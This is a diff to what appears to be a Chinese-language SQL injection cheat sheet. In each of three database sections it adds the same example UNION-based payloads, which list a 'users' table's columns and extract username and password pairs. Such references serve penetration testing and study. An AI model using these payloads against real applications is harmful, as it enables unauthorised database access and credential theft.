@@ -87,6 +87,10 @@ SELECT @@version
 SELECT * FROM information_schema.tables
 // 列出数据库中某个表中的所有列
 SELECT * FROM information_schema.columns WHERE table_name = '表名'
+// 实例
+'+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name='users'--
+'+UNION+SELECT+username,password+FROM+users--
+
 ```
 
 ### 条件错误
@@ -137,6 +141,9 @@ SELECT version()
 SELECT * FROM information_schema.tables
 // 列出数据库中某个表中的所有列
 SELECT * FROM information_schema.columns WHERE table_name = '表名'
+// 实例
+'+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name='users'--
+'+UNION+SELECT+username,password+FROM+users--
 ```
 
 ### 条件错误
@@ -189,6 +196,9 @@ SELECT @@version
 SELECT * FROM information_schema.tables
 // 列出数据库中某个表中的所有列
 SELECT * FROM information_schema.columns WHERE table_name = '表名'
+// 实例
+'+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name='users'--
+'+UNION+SELECT+username,password+FROM+users--
 ```
 
 ### 条件错误
